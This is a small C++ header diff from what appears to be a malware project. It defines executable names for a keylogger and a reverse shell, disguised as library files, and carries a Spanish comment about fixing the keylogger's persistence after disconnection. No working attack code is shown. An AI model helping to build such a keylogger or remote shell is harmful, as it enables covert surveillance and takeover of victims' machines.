@@ -2,8 +2,7 @@
 #include <fstream>
 #include <string>
 #include "errors.hpp"
-#pragma comment(lib, "Ws2_32.lib")
-
+#pragma once
 //Arreglar error de q libarbys se mantiene incluso cuando ya termino la conexion
 #define key_logger_name "libarbys.exe"
 #define reverse_shell_name "libval.exe"
